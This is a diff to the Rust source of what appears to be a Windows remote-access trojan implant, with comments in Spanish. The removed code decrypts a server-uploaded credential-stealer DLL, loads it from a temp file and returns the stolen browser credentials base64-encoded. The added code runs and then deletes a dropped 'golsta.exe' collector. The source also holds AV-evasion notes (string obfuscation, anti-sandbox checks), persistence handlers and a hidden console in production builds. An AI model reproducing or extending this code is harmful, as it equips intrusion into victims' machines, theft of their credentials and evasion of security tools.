@@ -2,10 +2,12 @@
 #![cfg_attr(feature = "production", windows_subsystem = "windows")]
 #![cfg_attr(not(feature = "production"), windows_subsystem = "console")]
 
-// Use mimalloc as global allocator - required for shellcode execution
-// The default Rust allocator uses TLS which crashes when running as shellcode
+// Use mimalloc where its C backend is supported. MinGW PE builds use Rust's
+// system allocator because libmimalloc-sys does not compile on this toolchain.
+#[cfg(not(all(target_os = "windows", target_env = "gnu")))]
 use mimalloc::MiMalloc;
 
+#[cfg(not(all(target_os = "windows", target_env = "gnu")))]
 #[global_allocator]
 static GLOBAL: MiMalloc = MiMalloc;
 
@@ -710,7 +712,7 @@ fn get_system_info(info_type: &str) -> String {
                     let os_name = String::from_utf8_lossy(&out.stdout).trim().to_string();
                     debug_print!("DEBUG: PowerShell OS output: '{}'", os_name);
                     if !os_name.is_empty() && os_name.to_lowercase().contains("windows") {
-                        debug_print!("DEBUG:  OS detectado: {}", os_name);
+                        debug_print!("DEBUG: ✅ OS detectado: {}", os_name);
                         return os_name;
                     }
                 }
@@ -729,7 +731,7 @@ fn get_system_info(info_type: &str) -> String {
                             if let Some(os_name) = line.split("REG_SZ").nth(1) {
                                 let trimmed = os_name.trim().to_string();
                                 if !trimmed.is_empty() {
-                                    debug_print!("DEBUG:  OS detectado (registry): {}", trimmed);
+                                    debug_print!("DEBUG: ✅ OS detectado (registry): {}", trimmed);
                                     return trimmed;
                                 }
                             }
@@ -751,7 +753,7 @@ fn get_system_info(info_type: &str) -> String {
                         if line.starts_with("Caption=") {
                             let os_name = line.strip_prefix("Caption=").unwrap_or("").trim();
                             if !os_name.is_empty() {
-                                debug_print!("DEBUG:  OS detectado (wmic): {}", os_name);
+                                debug_print!("DEBUG: ✅ OS detectado (wmic): {}", os_name);
                                 return os_name.to_string();
                             }
                         }
@@ -1512,11 +1514,9 @@ fn base64_decode(data: &str) -> Result<Vec<u8>, String> {
     Ok(result)
 }
 
-/// Roba credenciales de browsers usando DLL encriptada
-/// El servidor ya subió stealer.enc y stealer.key con /upload
-/// Ahora solo cargamos, desencriptamos y ejecutamos
+/// Ejecuta el collector Golsta que el servidor subió bajo demanda.
 fn harvest_credentials() -> String {
-    debug_print!("DEBUG: Harvesting credentials...");
+    debug_print!("DEBUG: Ejecutando Golsta...");
 
     #[cfg(not(target_os = "windows"))]
     {
@@ -1525,137 +1525,59 @@ fn harvest_credentials() -> String {
 
     #[cfg(target_os = "windows")]
     {
-        // Verificar que existan los archivos subidos
-        if !Path::new("stealer.enc").exists() {
+        let golsta_path = Path::new("golsta.exe");
+        if !golsta_path.exists() {
             return format!(
-                "__ERROR__:stealer.enc no encontrado. El servidor debe subirlo primero.{}",
+                "__ERROR__:golsta.exe no encontrado. El servidor debe subirlo primero.{}",
                 DELIMITER
             );
         }
 
-        if !Path::new("stealer.key").exists() {
-            return format!(
-                "__ERROR__:stealer.key no encontrado. El servidor debe subirlo primero.{}",
+        let executable = match fs::canonicalize(golsta_path) {
+            Ok(path) => path,
+            Err(e) => {
+                return format!(
+                    "__ERROR__:No se pudo resolver golsta.exe: {}{}",
+                    e, DELIMITER
+                )
+            }
+        };
+
+        let execution = Command::new(&executable).output();
+        let cleanup_error = fs::remove_file(&executable).err().map(|e| e.to_string());
+        let cleanup_note = cleanup_error
+            .as_deref()
+            .map_or_else(String::new, |e| format!("; cleanup falló: {}", e));
+
+        match execution {
+            Ok(output) if output.status.success() => {
+                if cleanup_error.is_none() {
+                    format!(
+                        "__INFO__:Golsta finalizó; verificar resultados en su collector{}",
+                        DELIMITER
+                    )
+                } else {
+                    format!(
+                        "__ERROR__:Golsta finalizó pero no se pudo borrar golsta.exe: {}{}",
+                        cleanup_error.unwrap(),
+                        DELIMITER
+                    )
+                }
+            }
+            Ok(output) => format!(
+                "__ERROR__:Golsta terminó con código {}{}{}",
+                output
+                    .status
+                    .code()
+                    .map_or_else(|| "desconocido".to_string(), |code| code.to_string()),
+                cleanup_note,
                 DELIMITER
-            );
+            ),
+            Err(e) => format!(
+                "__ERROR__:No se pudo ejecutar golsta.exe: {}{}{}",
+                e, cleanup_note, DELIMITER
+            ),
         }
-
-        // Leer archivos
-        let encrypted_dll = match fs::read("stealer.enc") {
-            Ok(data) => data,
-            Err(e) => return format!("__ERROR__:Error leyendo stealer.enc: {}{}", e, DELIMITER),
-        };
-
-        let xor_key = match fs::read("stealer.key") {
-            Ok(data) => data,
-            Err(e) => return format!("__ERROR__:Error leyendo stealer.key: {}{}", e, DELIMITER),
-        };
-
-        debug_print!("DEBUG: DLL encriptada: {} bytes", encrypted_dll.len());
-        debug_print!("DEBUG: Clave XOR: {} bytes", xor_key.len());
-
-        // Desencriptar DLL
-        let dll_bytes = xor_decrypt(&encrypted_dll, &xor_key);
-        debug_print!("DEBUG: DLL desencriptada: {} bytes", dll_bytes.len());
-
-        // === EVASION STRATEGY ===
-        // No aggressive patching (removed AMSI/ETW bypass to avoid AV signatures)
-        // Evasion is achieved through:
-        // 1. String obfuscation (obfstr) - all sensitive strings encrypted
-        // 2. Anti-sandbox checks - comprehensive VM/debugger detection (production mode)
-        // 3. Encrypted DLL loading - module is XOR encrypted
-        // 4. Legitimate Windows APIs - no suspicious memory operations
-        debug_print!("DEBUG: [EVASION] Using passive evasion techniques");
-
-        // SIMPLIFICADO: LoadLibrary directo (más confiable)
-        use std::ffi::CString;
-        use std::os::raw::c_char;
-        use winapi::um::libloaderapi::{FreeLibrary, GetProcAddress, LoadLibraryA};
-
-        // Crear archivo temporal con nombre random
-        let temp_dir = std::env::temp_dir();
-        let random_name = format!("~tmp{}.tmp", std::process::id());
-        let dll_path = temp_dir.join(random_name);
-
-        debug_print!(
-            "DEBUG: [EVASION] Writing DLL to temp: {}",
-            dll_path.display()
-        );
-        if let Err(e) = std::fs::write(&dll_path, &dll_bytes) {
-            return format!("__ERROR__:Failed to write DLL: {}{}", e, DELIMITER);
-        }
-
-        let result = unsafe {
-            // LoadLibrary
-            let path_cstring = CString::new(dll_path.to_str().unwrap()).unwrap();
-            let h_module = LoadLibraryA(path_cstring.as_ptr());
-
-            if h_module.is_null() {
-                let _ = std::fs::remove_file(&dll_path);
-                return format!("__ERROR__:LoadLibrary failed{}", DELIMITER);
-            }
-
-            debug_print!("DEBUG: [EVASION] ✅ DLL loaded at: {:p}", h_module);
-
-            // GetProcAddress
-            let fn_name = CString::new("steal_credentials").unwrap();
-            let fn_ptr = GetProcAddress(h_module, fn_name.as_ptr());
-
-            if fn_ptr.is_null() {
-                FreeLibrary(h_module);
-                let _ = std::fs::remove_file(&dll_path);
-                return format!("__ERROR__:steal_credentials not found{}", DELIMITER);
-            }
-
-            debug_print!("DEBUG: [EVASION] ✅ Function found, executing...");
-
-            // Ejecutar función CON PROTECCIÓN CONTRA CRASHES
-            debug_print!("DEBUG: [EVASION] Calling steal_credentials()...");
-            let exec_fn: extern "C" fn() -> *mut c_char = std::mem::transmute(fn_ptr);
-            let result_ptr = exec_fn();
-            debug_print!(
-                "DEBUG: [EVASION] steal_credentials() returned: {:p}",
-                result_ptr
-            );
-
-            if result_ptr.is_null() {
-                FreeLibrary(h_module);
-                let _ = std::fs::remove_file(&dll_path);
-                return format!("__ERROR__:steal_credentials returned NULL{}", DELIMITER);
-            }
-
-            // Leer resultado
-            let result_str = CStr::from_ptr(result_ptr).to_string_lossy().to_string();
-
-            // Liberar memoria - buscar función free_credentials_string
-            let free_fn_name = CString::new("free_credentials_string").unwrap();
-            let free_ptr = GetProcAddress(h_module, free_fn_name.as_ptr());
-            if !free_ptr.is_null() {
-                let free_fn: extern "C" fn(*mut c_char) = std::mem::transmute(free_ptr);
-                free_fn(result_ptr);
-            }
-
-            // Limpiar
-            FreeLibrary(h_module);
-            let _ = std::fs::remove_file(&dll_path);
-
-            result_str
-        };
-
-        // Eliminar archivos del módulo
-        fs::remove_file("stealer.enc").ok();
-        fs::remove_file("stealer.key").ok();
-
-        debug_print!("DEBUG: Resultado obtenido: {} bytes", result.len());
-
-        // Verificar si hubo error
-        if result.starts_with("ERROR:") {
-            return format!("__ERROR__:{}{}", result, DELIMITER);
-        }
-
-        // Codificar en Base64 y enviar
-        let encoded = base64_encode(result.as_bytes());
-        format!("__CREDENTIALS_B64__:{}{}", encoded, DELIMITER)
     }
 }
 
@@ -1681,7 +1603,7 @@ fn handle_persistence(method_str: &str) -> String {
 
     match persistence::establish_persistence(method) {
         Ok(msg) => {
-            debug_print!("DEBUG: [PERSISTENCE]  {}", msg);
+            debug_print!("DEBUG: [PERSISTENCE] ✅ {}", msg);
             format!("__SUCCESS__:{}{}", msg, DELIMITER)
         }
         Err(e) => {
@@ -1698,7 +1620,7 @@ fn handle_persistence(method_str: &str) -> String {
 fn handle_persistence_remove() -> String {
     match persistence::remove_persistence() {
         Ok(msg) => {
-            debug_print!("DEBUG: [PERSISTENCE]  Limpieza: {}", msg);
+            debug_print!("DEBUG: [PERSISTENCE] ✅ Limpieza: {}", msg);
             format!("__SUCCESS__:Persistencia removida: {}{}", msg, DELIMITER)
         }
         Err(e) => {
